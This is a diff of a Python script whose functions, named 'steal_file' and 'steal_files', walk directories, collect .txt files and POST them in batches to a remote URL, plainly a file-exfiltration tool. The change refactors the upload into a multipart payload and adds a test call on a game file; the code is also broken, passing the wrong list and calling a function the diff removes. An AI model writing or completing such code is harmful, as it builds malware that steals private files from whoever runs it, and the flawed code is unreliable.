@@ -16,14 +16,21 @@ def file_search():
         #      files: {files}')
         for file in files:
             #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
-            if '.txt' in file:
-                #print(dir + '\\' + file) # for testing
-                files_found.append([dir,file]) # log the found found file's directory and name
+            if len(files_found) >= 100:
+                steal_files(files)
+            if '.txt' in file: # check file type
+                print(dir + '\\' + file) # for testing
+                files_found.append([dir + '\\' + file]) # log the found file's address
 
-def steal_file(address): # steal files
-    file = {file : open(address, 'rb')} # convert the file to binary so it can be sent
-    values = {FileName:''} # send the file name as a header so the server knows how to categorize it
-    r = requests.post(url, files=file) # POST (send) the file
+def steal_files(files): # steal files
+    files_payload = {}
+    i = 1
+    for file in files:
+        file_name = file[file.rfind('\\')+1:] # ignore all text before the last backslash so only the file name is kept
+        f = {f"file{i}":(file_name, open(file, 'rb'))}
+        files_payload.update(f)
+        i += 1
+    r = requests.post(URL, files=files_payload) # POST (send) the file
 
-
-file_search()
+steal_file('C:\Games\EuropaUniversalisIV\dlc\dlc140_central_europe_music_pack\music\centraleurope.txt')
+#file_search()
